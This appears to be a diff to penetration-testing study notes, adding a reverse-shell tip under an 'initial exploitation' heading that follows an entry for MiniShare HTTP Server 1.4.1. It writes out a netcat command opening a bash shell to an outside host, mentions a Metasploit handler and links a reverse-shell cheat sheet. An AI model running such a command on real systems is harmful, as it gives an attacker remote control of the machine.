@@ -378,6 +378,9 @@ MiniShare HTTP Server 1.4.1
 
 # INITIAL EXPLOITATION
 
+Reverse shell tips:
+* If a standard reverse-shell such as `nc 10.11.0.222 4444 -e /bin/bash` doesn't work, use `exploit/multi/handler` to catch the connection.
+
 Reverse shell cheatsheet:
 * http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/
 
